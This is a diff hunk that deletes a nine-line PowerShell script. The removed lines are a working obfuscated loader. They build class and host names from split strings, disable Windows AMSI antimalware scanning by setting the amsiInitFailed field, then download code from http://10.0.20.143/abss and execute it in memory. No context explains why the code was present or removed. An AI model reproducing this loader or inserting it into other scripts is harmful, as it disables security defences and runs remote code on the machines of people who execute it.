@@ -1,9 +1,0 @@
-$a='S'+'ystem.Management.Automation.Ams'+'iUt'+'ils'
-$t=[Ref].Assembly.GetType($a)
-$f=$t.GetField('amsiInitFailed','NonPublic,Static')
-$f.SetValue($null,$true)
-$w='n'+'e'+'t'+'.'+'w'+'e'+'b'+'c'+'l'+'i'+'e'+'n'+'t'
-$url='h'+'t'+'t'+'p'+':'+'/'+'/'+'10.0.20.143'+':'+'80'+'/'+'abss'
-$web=New-Object ($w)
-$payload=$web.DownloadString($url)
-[ScriptBlock]::Create($payload).Invoke()
